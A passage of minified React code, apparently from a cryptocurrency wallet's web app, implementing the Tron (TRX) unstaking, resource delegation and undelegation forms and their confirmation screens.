            topUpWalletLink: "trx-unstake_topUpWalletLink_1Q2fb",
            resourcesSelector: "trx-unstake_resourcesSelector_39NEE",
            selectorsArrow: "trx-unstake_selectorsArrow_2i7Bb",
            selectorWrapper: "trx-unstake_selectorWrapper_3E1lk"
        };
        function TrxUnstake() {
            const e = useLocationSearch()
              , t = O.createRef()
              , a = (0,
            $.v9)(eu)
              , [n,r] = (0,
            O.useState)(!1)
              , l = a(e.walletFrom) || void 0
              , [s,i] = (0,
            O.useState)()
              , [o,c] = (0,
            O.useState)()
              , [u,d] = (0,
            O.useState)(rH[0])
              , [m,p] = (0,
            O.useState)(lH[1]);
            (0,
            O.useEffect)(( () => {
                const fetchStakingRecords = async () => {
                    if (!l)
                        return;
                    const e = await Se.Z.getApiByWallet(l)
                      , {active: t} = await e.getV2StakingRecordsByAddress({
                        address: l.address
                    })
                      , a = await e.getV1StakingRecordsByAddress({
                        address: l.address
                    });
                    c({
                        v1: a,
                        v2: t
                    });
                    p(a.length ? lH[0] : lH[1])
                }
                ;
                fetchStakingRecords()
            }
            ), [l]);
            (0,
            O.useEffect)(( () => {
                d((e => {
                    var t;
                    const a = e.id === rH[0].id ? rH[1] : rH[0]
                      , n = null === (t = a.id) || void 0 === t ? void 0 : t.toLowerCase()
                      , r = undefined;
                    return (("1" === m.id ? null == o ? void 0 : o.v1 : null == o ? void 0 : o.v2) || []).some((e => {
                        let {resource: t} = e;
                        return t.toLowerCase() === n
                    }
                    )) ? a : e
                }
                ))
            }
            ), [m]);
            (0,
            O.useEffect)(( () => i("")), [u]);
            const f = (0,
            O.useMemo)(( () => {
                const e = Date.now();
                if (!o)
                    return "0";
                const t = undefined;
                return ("1" === m.id ? o.v1.filter((t => t.freezedUntilTimestamp < e)) : o.v2).filter((e => {
                    var t;
                    let {resource: a, ownerAddress: n} = e;
                    return a.toLowerCase() === (null === (t = u.id) || void 0 === t ? void 0 : t.toLowerCase()) && n === (null == l ? void 0 : l.address)
                }
                )).reduce(( (e, t) => {
                    let {frozenBalance: a, ownerAddress: n, receivingResourcesAddress: r} = t;
                    return e[n === r ? "plus" : "minus"](a)
                }
                ), new (Sc())(0)).toString()
            }
            ), [m, u, null == l ? void 0 : l.address, o])
              , [E,h,,g,,y] = use_fee(l, l, s, {
                totalBalance: null != l && l.balance ? l.balance : void 0
            })
              , v = (0,
            O.useMemo)(( () => !y && (0,
            Ko.gt)(E, null == l ? void 0 : l.balance)), [E, null == l ? void 0 : l.balance, y])
              , handleAmount = e => {
                let {target: {value: t}} = e;
                return i(t)
            }
              , handleResource = e => d(e)
              , handleStakingVersion = e => p(e)
              , handleSetMaxAmount = () => i(f)
              , handleNext = e => {
                var a, n;
                const {isValid: l} = null !== (a = null === (n = t.current) || void 0 === n ? void 0 : n.validate()) && void 0 !== a ? a : {};
                if (!l) {
                    r(!0);
                    e.preventDefault()
                }
            }
            ;
            (0,
            O.useEffect)(( () => {
                "1" === (null == m ? void 0 : m.id) && (0,
                Ko.gt)(f, 0) && i(f)
            }
            ), [m, f]);
            const _ = new URLSearchParams({
                walletFrom: (null == l ? void 0 : l.uuid) || "",
                amount: s || "",
                resource: u.id || "",
                stakingVersion: m.id || ""
            })
              , w = `${(0,
            M.RU)()}/staking-trx/unstaking/confirm?${_.toString()}`
              , b = new URLSearchParams({
                walletFrom: (null == l ? void 0 : l.uuid) || ""
            })
              , k = `${(0,
            M.RU)()}/receive?${b.toString()}`;
            return O.createElement("div", {
                className: uH.wrapper
            }, O.createElement(DashboardMenu, null), O.createElement("div", {
                className: uH.wrapperForm
            }, O.createElement(sf(), {
                ref: t
            }, O.createElement(label, null, "Wallet"), O.createElement(Mh, {
                selectedWallet: l,
                disabled: !0,
                noDisabledStyle: !0
            }), O.createElement(label, null, "Amount"), O.createElement("div", {
                className: uH.blocked
            }, O.createElement(lf.ValidatorField, {
                value: s,
                rules: zf.amount({
                    precision: null == l ? void 0 : l.precision,
                    min: 0,
                    max: f,
                    available: f
                })
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && n,
                    message: a
                }, O.createElement(Ea, {
                    onChange: handleAmount,
                    value: s,
                    placeholder: "0",
                    disabled: "1" === (null == m ? void 0 : m.id)
                }))
            }
            ))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Available:"), O.createElement(MiskInfoValue, {
                onClick: handleSetMaxAmount
            }, (0,
            Ko.yF)(f), " ", (0,
            be.xG)(null == l ? void 0 : l.currency))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Staking version:"), O.createElement(MiskInfoValue, {
                className: uH.selectorWrapper
            }, O.createElement(Lp, {
                emptyPlaceholder: "",
                placeholder: "",
                inputWrapperClassName: uH.resourcesSelector,
                arrowClassName: uH.selectorsArrow,
                selected: m,
                hasSearch: !1,
                items: lH,
                onChange: handleStakingVersion
            }))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Unstaking resource:"), O.createElement(MiskInfoValue, {
                className: uH.selectorWrapper
            }, O.createElement(Lp, {
                emptyPlaceholder: "",
                placeholder: "",
                inputWrapperClassName: uH.resourcesSelector,
                arrowClassName: uH.selectorsArrow,
                selected: u,
                hasSearch: !1,
                items: rH,
                onChange: handleResource
            }))), v && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient funds. The fee is paid from the wallet balance. Estimated Network Fee ", E, " TRX.", " ", O.createElement("a", {
                className: uH.topUpWalletLink,
                href: k
            }, "Top up your wallet")), h && O.createElement(ui_message, {
                type: "error"
            }, "Error calculating fee, please", " ", O.createElement("a", {
                className: uH.updateBalanceLink,
                onClick: g
            }, "try again")), O.createElement("div", {
                className: uH.footerBlock
            }, O.createElement("div", {
                className: uH.stepInfo
            }, "Step 1 of 3"), v ? O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/receive`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Back")) : O.createElement(Y.OL, {
                to: w,
                onClick: handleNext
            }, O.createElement(Yl, {
                color: "blue"
            }, "Unstake"))))))
        }
        const dH = "checkbox-slider_wrapper_3jfpZ"
          , mH = "checkbox-slider_wrapperNoPadding_29Mie"
          , pH = "checkbox-slider_text_aCbIk"
          , fH = "checkbox-slider_switch_31I4A"
          , EH = "checkbox-slider_disabledSwitch_2gsv7"
          , hH = "checkbox-slider_slider_2jyG9"
          , gH = "checkbox-slider_input_3W8zG";
        function CheckboxSlider(e) {
            const {id: t} = e;
            return O.createElement("div", {
                className: e.noPadding ? mH : dH,
                onClick: e.handleChange
            }, O.createElement("div", {
                className: pH
            }, e.children), O.createElement("label", {
                htmlFor: "checkbox",
                className: e.disabled ? EH : fH
            }, O.createElement("input", {
                name: "checkbox",
                type: "checkbox",
                id: t || "",
                checked: e.isChecked,
                className: gH,
                onChange: () => {}
            }), O.createElement("span", {
                className: hH
            })))
        }
        CheckboxSlider.propTypes = {
            children: as().node,
            isChecked: as().bool,
            handleChange: as().func.isRequired,
            noPadding: as().bool,
            disabled: as().bool,
            id: as().string
        };
        CheckboxSlider.defaultProps = {
            disabled: !1
        };
        const yH = CheckboxSlider
          , vH = {
            wrapper: "trx-delegation_wrapper_FRG4b app_wrapperBlock_2EpA3",
            wrapperForm: "trx-delegation_wrapperForm_AAl4w app_wrapperLeftBlock_3QLZp",
            footerBlock: "trx-delegation_footerBlock_2ecuI app_footerBlock_n86Kc",
            stepInfo: "trx-delegation_stepInfo_1V_fP app_stepInfo_2VLE6",
            topUpWalletLink: "trx-delegation_topUpWalletLink_9AjQg",
            resourcesSelector: "trx-delegation_resourcesSelector_hPpcI",
            selectorsArrow: "trx-delegation_selectorsArrow_1iTjZ",
            selectorWrapper: "trx-delegation_selectorWrapper_2Edqx",
            blocked: "trx-delegation_blocked_39tU5"
        }
          , _H = [{
            type: "wallet",
            title: "to Tron address"
        }, {
            type: "address",
            title: "to Tron wallet"
        }]
          , wH = 5
          , bH = 1;
        function TrxDelegateResources() {
            var e;
            const t = useLocationSearch()
              , a = O.createRef()
              , n = (0,
            $.v9)(eu)
              , [r,l] = (0,
            O.useState)(!1)
              , s = n(t.walletFrom) || void 0
              , [i,o] = (0,
            O.useState)()
              , c = use_wallets_to(null != s ? s : void 0)
              , [u,d] = (0,
            O.useState)("")
              , [m,p] = (0,
            O.useState)("")
              , [f,E] = (0,
            O.useState)(rH[0])
              , [h,g] = (0,
            O.useState)(_H[0])
              , [y,v] = (0,
            O.useState)(!1)
              , [_,w] = (0,
            O.useState)("")
              , [b,k] = (0,
            O.useState)(!0)
              , [S,C] = (0,
            O.useState)(1);
            (0,
            O.useEffect)(( () => {
                const fetchMaxAmount = async () => {
                    if (!s)
                        return;
                    const e = await Se.Z.getApiByWallet(s);
                    p(await e.getAvailableForDelegation({
                        address: s.address,
                        resource: f.id
                    }))
                }
                ;
                fetchMaxAmount()
            }
            ), [s, f.id]);
            (0,
            O.useEffect)(( () => d("")), [f, i, h]);
            const [N,T,,A,,x] = use_fee(s, s, u, {
                totalBalance: null != s && s.balance ? s.balance : void 0
            })
              , I = (0,
            O.useMemo)(( () => !x && (0,
            Ko.gt)(N, null == s ? void 0 : s.balance)), [N, null == s ? void 0 : s.balance, x])
              , P = new URLSearchParams({
                walletFrom: (null == s ? void 0 : s.uuid) || "",
                walletTo: (null == i ? void 0 : i.uuid) || "",
                addressTo: _ || "",
                amount: u || "",
                resource: f.id || "",
                lock: y.toString(),
                lockPeriodDays: S.toString()
            })
              , L = `${(0,
            M.RU)()}/staking-trx/delegate-resources/confirm?${P.toString()}`
              , F = new URLSearchParams({
                walletFrom: (null == s ? void 0 : s.uuid) || ""
            })
              , W = `${(0,
            M.RU)()}/receive?${F.toString()}`
              , handleAmount = e => {
                let {target: {value: t}} = e;
                return d(t)
            }
              , handleResource = e => E(e)
              , handleChangeSendType = () => g((e => _H["wallet" === e.type ? 1 : 0]))
              , handleChangeAddress = e => w(e)
              , handleValidateAddressTo = e => k(e)
              , handleChangeToWallet = e => o(e)
              , handleChangeLockDelegation = () => v((e => !e))
              , handleSetMaxAmount = () => d(m)
              , handleChangeLockPeriodDays = e => {
                let {target: {value: t}} = e;
                return C(Number.parseInt(t, 10))
            }
              , handleNext = e => {
                var t, n;
                const {isValid: r} = null !== (t = null === (n = a.current) || void 0 === n ? void 0 : n.validate()) && void 0 !== t ? t : {};
                if (!r) {
                    l(!0);
                    e.preventDefault()
                }
            }
              , walletFilter = e => !(!e || (null == s ? void 0 : s.currency) !== e.currency && e.ticker);
            return O.createElement("div", {
                className: vH.wrapper
            }, O.createElement(DashboardMenu, null), O.createElement("div", {
                className: vH.wrapperForm
            }, O.createElement(sf(), {
                ref: a
            }, O.createElement(label, null, "Wallet"), O.createElement(Mh, {
                selectedWallet: s,
                disabled: !0,
                noDisabledStyle: !0
            }), O.createElement(label, null, "To", O.createElement(LabelAction, {
                onClick: handleChangeSendType
            }, h.title)), "address" === h.type && O.createElement("div", {
                className: vH.blocked
            }, O.createElement(lf.ValidatorField, {
                rules: zf.selfAddress,
                value: {
                    addressTo: _,
                    isSelfAddress: (null == s || null === (e = s.address) || void 0 === e ? void 0 : e.toLowerCase()) === _.toLowerCase(),
                    isValidAddress: b
                }
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && r,
                    message: a
                }, O.createElement(mE, {
                    value: _,
                    wallet: s,
                    onChange: handleChangeAddress,
                    onValidate: handleValidateAddressTo
                }))
            }
            )), !_ && O.createElement(qr_scanner_paste_button, {
                setAddress: w
            })), "wallet" === h.type && O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: i
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && r,
                    message: a
                }, O.createElement(Mh, {
                    updateBalanceOnChange: !0,
                    selectedWallet: null != i ? i : void 0,
                    wallets: c,
                    onChange: handleChangeToWallet,
                    withMultisigs: !0,
                    customFilter: walletFilter,
                    sendToWallets: null == s ? void 0 : s.currency.toUpperCase(),
                    isNewSelector: !0,
                    notSortByCmc: !0
                }))
            }
            )), O.createElement(label, null, "Amount"), O.createElement("div", {
                className: vH.blocked
            }, O.createElement(lf.ValidatorField, {
                value: u,
                rules: [...zf.amount({
                    precision: null == s ? void 0 : s.precision,
                    min: 0,
                    max: m,
                    available: m
                })]
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && r,
                    message: a
                }, O.createElement(Ea, {
                    onChange: handleAmount,
                    value: u,
                    placeholder: "0"
                }))
            }
            ))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Available:"), O.createElement(MiskInfoValue, {
                onClick: handleSetMaxAmount
            }, (0,
            Ko.yF)(m), " ", (0,
            be.xG)(null == s ? void 0 : s.currency))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Resource:"), O.createElement(MiskInfoValue, {
                className: vH.selectorWrapper
            }, O.createElement(Lp, {
                emptyPlaceholder: "",
                placeholder: "",
                inputWrapperClassName: vH.resourcesSelector,
                arrowClassName: vH.selectorsArrow,
                selected: f,
                hasSearch: !1,
                items: rH,
                onChange: handleResource
            }))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Lock delegation:"), O.createElement(MiskInfoValue, null, O.createElement(yH, {
                isChecked: y,
                handleChange: handleChangeLockDelegation,
                noPadding: !0
            }))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Lock period (days):"), O.createElement(MiskInfoValue, {
                className: vH.selectorWrapper
            }, O.createElement(lf.ValidatorField, {
                value: S,
                rules: [...zf.trxLockPeriod({
                    lock: y,
                    min: 1,
                    max: 5
                })]
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && r,
                    message: a
                }, O.createElement(Ea, {
                    disabled: !y,
                    onChange: handleChangeLockPeriodDays,
                    value: y ? S : "",
                    placeholder: "0",
                    type: "number",
                    className: vH.resourcesSelector
                }))
            }
            )))), I && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient funds. The fee is paid from the wallet balance. Estimated Network Fee ", N, " TRX.", " ", O.createElement("a", {
                className: vH.topUpWalletLink,
                href: W
            }, "Top up your wallet")), T && O.createElement(ui_message, {
                type: "error"
            }, "Error calculating fee, please", " ", O.createElement("a", {
                className: vH.updateBalanceLink,
                onClick: A
            }, "try again")), O.createElement("div", {
                className: vH.footerBlock
            }, O.createElement("div", {
                className: vH.stepInfo
            }, "Step 1 of 3"), I ? O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/receive`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Delegate")) : O.createElement(Y.OL, {
                to: L,
                onClick: handleNext
            }, O.createElement(Yl, {
                color: "blue"
            }, "Delegate"))))))
        }
        function TrxUndelegateResources() {
            var e;
            const t = useLocationSearch()
              , a = O.createRef()
              , n = (0,
            $.v9)(eu)
              , [r,l] = (0,
            O.useState)(!1)
              , s = n(t.walletFrom) || void 0
              , [i,o] = (0,
            O.useState)()
              , c = use_wallets_to(null != s ? s : void 0)
              , [u,d] = (0,
            O.useState)("")
              , [m,p] = (0,
            O.useState)([])
              , [f,E] = (0,
            O.useState)(rH[0])
              , [h,g] = (0,
            O.useState)(_H[0])
              , [y,v] = (0,
            O.useState)("")
              , [_,w] = (0,
            O.useState)(!0);
            (0,
            O.useEffect)(( () => {
                const fetchDelegations = async () => {
                    if (!s)
                        return;
                    const e = await Se.Z.getApiByWallet(s)
                      , {active: t} = await e.getV2StakingRecordsByAddress({
                        address: s.address
                    });
                    p(t)
                }
                ;
                fetchDelegations()
            }
            ), [s]);
            (0,
            O.useEffect)(( () => d("")), [f, h, i]);
            const b = (0,
            O.useMemo)(( () => {
                const e = "wallet" === h.type ? null == i ? void 0 : i.address : y
                  , t = Date.now();
                return m.filter((a => {
                    var n;
                    let {resource: r, receivingResourcesAddress: l, lockedUntilTimestamp: s} = a;
                    return r.toLowerCase() === (null === (n = f.id) || void 0 === n ? void 0 : n.toLowerCase()) && l === e && (s || 0) < t
                }
                )).reduce(( (e, t) => {
                    let {frozenBalance: a} = t;
                    return e.plus(a)
                }
                ), new (Sc())(0)).toString()
            }
            ), [y, m, f.id, h.type, null == i ? void 0 : i.address])
              , [k,S,,C,,N] = use_fee(s, s, u, {
                totalBalance: null != s && s.balance ? s.balance : void 0
            })
              , T = (0,
            O.useMemo)(( () => !N && (0,
            Ko.gt)(k, null == s ? void 0 : s.balance)), [k, null == s ? void 0 : s.balance, N])
              , A = new URLSearchParams({
                walletFrom: (null == s ? void 0 : s.uuid) || "",
                walletTo: (null == i ? void 0 : i.uuid) || "",
                addressTo: y || "",
                amount: u || "",
                resource: f.id || ""
            })
              , x = `${(0,
            M.RU)()}/staking-trx/undelegate-resources/confirm?${A.toString()}`
              , I = new URLSearchParams({
                walletFrom: (null == s ? void 0 : s.uuid) || ""
            })
              , P = `${(0,
            M.RU)()}/receive?${I.toString()}`
              , handleAmount = e => {
                let {target: {value: t}} = e;
                return d(t)
            }
              , handleResource = e => E(e)
              , handleChangeSendType = () => g((e => _H["wallet" === e.type ? 1 : 0]))
              , handleChangeAddress = e => v(e)
              , handleValidateAddressTo = e => w(e)
              , handleChangeToWallet = e => o(e)
              , handleSetMaxAmount = () => d(b)
              , handleNext = e => {
                var t, n;
                const {isValid: r} = null !== (t = null === (n = a.current) || void 0 === n ? void 0 : n.validate()) && void 0 !== t ? t : {};
                if (!r) {
                    l(!0);
                    e.preventDefault()
                }
            }
              , walletFilter = e => !(!e || (null == s ? void 0 : s.currency) !== e.currency && e.ticker);
            return O.createElement("div", {
                className: vH.wrapper
            }, O.createElement(DashboardMenu, null), O.createElement("div", {
                className: vH.wrapperForm
            }, O.createElement(sf(), {
                ref: a
            }, O.createElement(label, null, "Wallet"), O.createElement(Mh, {
                selectedWallet: s,
                disabled: !0,
                noDisabledStyle: !0
            }), O.createElement(label, null, "To", O.createElement(LabelAction, {
                onClick: handleChangeSendType
            }, h.title)), "address" === h.type && O.createElement("div", {
                className: vH.blocked
            }, O.createElement(lf.ValidatorField, {
                rules: zf.selfAddress,
                value: {
                    addressTo: y,
                    isSelfAddress: (null == s || null === (e = s.address) || void 0 === e ? void 0 : e.toLowerCase()) === y.toLowerCase(),
                    isValidAddress: _
                }
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && r,
                    message: a
                }, O.createElement(mE, {
                    value: y,
                    wallet: s,
                    onChange: handleChangeAddress,
                    onValidate: handleValidateAddressTo
                }))
            }
            )), !y && O.createElement(qr_scanner_paste_button, {
                setAddress: v
            })), "wallet" === h.type && O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: i
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && r,
                    message: a
                }, O.createElement(Mh, {
                    updateBalanceOnChange: !0,
                    selectedWallet: null != i ? i : void 0,
                    wallets: c,
                    onChange: handleChangeToWallet,
                    withMultisigs: !0,
                    customFilter: walletFilter,
                    sendToWallets: null == s ? void 0 : s.currency.toUpperCase(),
                    isNewSelector: !0,
                    notSortByCmc: !0
                }))
            }
            )), O.createElement(label, null, "Amount"), O.createElement("div", {
                className: vH.blocked
            }, O.createElement(lf.ValidatorField, {
                value: u,
                rules: [...zf.amount({
                    precision: null == s ? void 0 : s.precision,
                    min: 0,
                    max: b,
                    available: b
                })]
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && r,
                    message: a
                }, O.createElement(Ea, {
                    onChange: handleAmount,
                    value: u,
                    placeholder: "0"
                }))
            }
            ))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Available:"), O.createElement(MiskInfoValue, {
                onClick: handleSetMaxAmount
            }, (0,
            Ko.yF)(b), " ", (0,
            be.xG)(null == s ? void 0 : s.currency))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Resource:"), O.createElement(MiskInfoValue, {
                className: vH.selectorWrapper
            }, O.createElement(Lp, {
                emptyPlaceholder: "",
                placeholder: "",
                inputWrapperClassName: vH.resourcesSelector,
                arrowClassName: vH.selectorsArrow,
                selected: f,
                hasSearch: !1,
                items: rH,
                onChange: handleResource
            }))), T && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient funds. The fee is paid from the wallet balance. Estimated Network Fee ", k, " TRX.", " ", O.createElement("a", {
                className: vH.topUpWalletLink,
                href: P
            }, "Top up your wallet")), S && O.createElement(ui_message, {
                type: "error"
            }, "Error calculating fee, please", " ", O.createElement("a", {
                className: vH.updateBalanceLink,
                onClick: C
            }, "try again")), O.createElement("div", {
                className: vH.footerBlock
            }, O.createElement("div", {
                className: vH.stepInfo
            }, "Step 1 of 3"), T ? O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/receive`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Undelegate")) : O.createElement(Y.OL, {
                to: x,
                onClick: handleNext
            }, O.createElement(Yl, {
                color: "blue"
            }, "Undelegate"))))))
        }
        const kH = 86400;
        function TrxConfirmResources(e) {
            let {type: t} = e;
            const {amount: a="", walletFrom: n, walletTo: r, resource: l="", addressTo: s="", lock: i="", lockPeriodDays: o} = useLocationSearch()
              , c = (0,
            $.v9)(eu)
              , u = (0,
            O.useMemo)(( () => c(r) || {
                address: s,
                title: "",
                accountName: ""
            }), [s, r, c])
              , d = (0,
            j.k6)()
              , m = (0,
            $.I0)()
              , p = (0,
            $.v9)(nx)
              , f = (0,
            $.v9)(rx)
              , E = (0,
            $.v9)(sx)
              , h = (0,
            $.v9)(ix)
              , g = (0,
            O.useMemo)(( () => p || !!h), [p, h])
              , {fromWallet: y, toWallet: v, feeWallet: _} = useWalletsForStakingTx({
                walletIdFromParams: n,
                toWalletIsFromWallet: !0
            })
              , [w,b,k,S,,C] = use_fee(y, v, a)
              , {hardWalletType: N, isHardWallet: T, isInsufficientBalance: A} = useBooleanRules({
                fee: w,
                feeWallet: _,
                fromWallet: y,
                amount: a,
                feeResource: C
            })
              , {effectivePrivateKey: x} = useEffectiveValue({
                fromWalletCurrency: (null == y ? void 0 : y.currency) || "",
                validatorRate: "",
                validatorTitle: "",
                fee: w,
                fromWalletPrivateKey: (null == y ? void 0 : y.privateKey) || ""
            })
              , {formattedFeeCurrency: I, formattedCurrency: P, formattedAmount: L, formattedFamily: F} = useFormattedValue({
                feeWallet: _,
                fromWallet: y,
                amount: a
            })
              , {equivalentAmount: W} = useEquivalentValue({
                amount: a,
                fromWallet: y
            })
              , R = (0,
            O.useCallback)((async e => {
                await executeCallbackAndSetTimeout({
                    callback: () => m(lb.setProcessCommit({
                        processText: e
                    }))
                })
            }
            ), [m])
              , handleConfirm = () => {
                g || A || k || !y || m(lb["delegate" === t ? "delegateResourceConfirm" : "undelegateResourceConfirm"]({
                    uuid: y.uuid,
                    wallet: {
                        uuid: y.uuid,
                        currency: y.currency,
                        balance: y.balance,
                        privateKey: x,
                        address: y.address,
                        rewardAddress: y.rewardAddress
                    },
                    resource: l,
                    amount: a,
                    addressTo: u.address,
                    lock: "true" === i,
                    lockPeriodSeconds: o ? Number.parseInt(o, 10) * kH : void 0
                }))
            }
            ;
            (0,
            O.useEffect)((function showLoadingTextOfLoadingFee() {
                m(k ? lb.setLoadingStart({
                    processText: "Loading Fee..."
                }) : lb.setLoadingStop())
            }
            ), [m, k, R]);
            (0,
            O.useLayoutEffect)((function goToNextStepIfHaveTransactionHash() {
                if ("string" == typeof h) {
                    const e = new URLSearchParams({
                        amount: a || "",
                        hash: h,
                        walletFrom: (null == y ? void 0 : y.uuid) || "",
                        currency: (null == y ? void 0 : y.currency) || "",
                        type: `trx${capitalize(t)}Tx`
                    });
                    d.replace({
                        pathname: (0,
                        M.RU)("/send/success"),
                        search: e.toString()
                    })
                }
            }
            ), [a, null == y ? void 0 : y.currency, null == y ? void 0 : y.uuid, d, h, t]);
            (0,
            O.useEffect)((function clearStore() {
                return () => {
                    m(lb.setClearStore())
                }
            }
            ), []);
            return y && _ ? O.createElement("div", {
                className: QG
            }, O.createElement(DashboardMenu, null), O.createElement("div", {
                className: JG
            }, O.createElement("div", {
                className: aV
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, capitalize(t), " ", L, " ", O.createElement("span", {
                className: "nowrap"
            }, P), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You ", t, O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, L, " ", O.createElement("span", {
                className: "nowrap"
            }, P), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: W,
                renderCurrency: !0
            })))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Resource"), O.createElement(ConfirmInfoValue, null, capitalize(l))), "delegate" === t && O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Lock", "true" === i ? ` for ${o} days:` : ":"), O.createElement(ConfirmInfoValue, null, "true" === i ? "Yes" : "No")), O.createElement(ConfirmInfoWallet, {
                type: "to",
                wallet: u
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Estimated Network Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, O.createElement(FeeBlock, {
                resource: C,
                fee: w,
                isLoadingFee: k,
                feeWallet: _,
                formattedFeeCurrency: C && (0,
                be.iX)(C) || I
            }))), O.createElement("div", {
                className: nV
            }), O.createElement(ledger_token_info, {
                parentWallet: _
            }), O.createElement(HardWalletMessage, {
                isVisible: g && T,
                hardWalletType: N || "",
                formattedFamily: F
            }), O.createElement(FailedLoadFeeError_FailedLoadFeeError, {
                isVisible: b,
                handleRetryFee: S
            }), O.createElement(InsufficientBalanceError_InsufficientBalanceError_InsufficientBalanceError, {
                isVisible: A,
                formattedFeeCurrency: I,
                fee: w,
                fromWallet: y,
                isFeeWalletOng: !1,
                feeWalletBalance: _.balance
            }), E && O.createElement(bf, {
                error: E
            }), O.createElement("div", {
                className: sV
            }, g && O.createElement("div", {
                className: uV
            }, f && O.createElement("span", null, f)), !g && O.createElement("div", {
                className: iV
            }, "Step 2 of 3"), O.createElement("div", {
                className: oH
            }, !g && O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/staking-trx/${t}-resources/?walletFrom=${(null == y ? void 0 : y.uuid) || ""}`
            }, "Back"), O.createElement(CloseOrConfirmButton, {
                showConfirmButton: !A,
                isLoading: g,
                onClick: handleConfirm,
                walletUuid: y.uuid
            }))))) : O.createElement(O.Fragment, null)
        }
        function TrxCancelUnstakeConfirm() {
            const e = (0,
            j.k6)()
              , [t,a] = (0,
            O.useState)()
              , [n,r] = (0,
            O.useState)(!1)
              , [l,s] = (0,
            O.useState)("")
              , {amount: i, walletFrom: o} = useLocationSearch()
              , {fromWallet: c, toWallet: u, feeWallet: d} = useWalletsForStakingTx({
                walletIdFromParams: o
            })
              , [m,p,f,E,,h] = use_fee(c, u, i)
              , {formattedFeeCurrency: g, formattedAmount: y, formattedCurrency: v} = useFormattedValue({
                feeWallet: d,
                fromWallet: c,
                amount: i
            })
              , {equivalentAmount: _} = useEquivalentValue({
                amount: i,
                fromWallet: c
            })
              , {isInsufficientBalance: w} = useBooleanRules({
                fee: m,
                feeWallet: d,
                fromWallet: c,
                amount: i,
                feeResource: h
            })
              , handleConfirm = async () => {
                if (!c)
                    return;
                r(!0);
                s("Sending transaction...");
                const t = await Se.Z.getApiByWallet(c);
                try {
                    const n = await t.cancelUnstake({
                        address: c.address,
                        wallet: c
                    });
                    s("");
                    r(!1);
                    if (n.error) {
                        a(n.error);
                        return
                    }
                    if (n.hash) {
                        const t = new URLSearchParams({
                            type: "trxCancelUnstakeTx",
                            amount: i || "",
                            hash: n.hash,
                            walletFrom: c.uuid,
                            currency: c.currency
                        });
                        e.replace({
                            pathname: (0,
                            M.RU)("/send/success"),
                            search: t.toString()
                        })
                    }
                } catch (e) {
                    r(!1)
                }
            }
            ;
            return c && d ? O.createElement("div", {
                className: QG
            }, O.createElement(DashboardMenu, null), O.createElement("div", {
                className: JG
            }, O.createElement("div", {
                className: aV
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Cancel unstake of ", i, " ", O.createElement("span", {
                className: "nowrap"
            }, "TRX"), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will return to staking", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, y, " ", O.createElement("span", {
                className: "nowrap"
            }, v), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: _,
                renderCurrency: !0
            })))), O.createElement(ConfirmInfoWallet, {
                type: "to",
                wallet: c
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Network Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, O.createElement(FeeBlock, {
                resource: h,
                fee: m,
                isLoadingFee: f,
                feeWallet: d,
                formattedFeeCurrency: h && (0,
                be.iX)(h) || g
            }))), O.createElement("div", {
                className: nV
            }), O.createElement(FailedLoadFeeError_FailedLoadFeeError, {
                isVisible: p,
                handleRetryFee: E
            }), O.createElement(InsufficientBalanceError_InsufficientBalanceError_InsufficientBalanceError, {
                isVisible: w,
                formattedFeeCurrency: g,
                fee: m,
                fromWallet: c,
                isFeeWalletOng: !1,
                feeWalletBalance: null == d ? void 0 : d.balance
            }), t && O.createElement(bf, {
                error: t
            }), O.createElement("div", {
                className: sV
            }, n && O.createElement("div", {
                className: uV
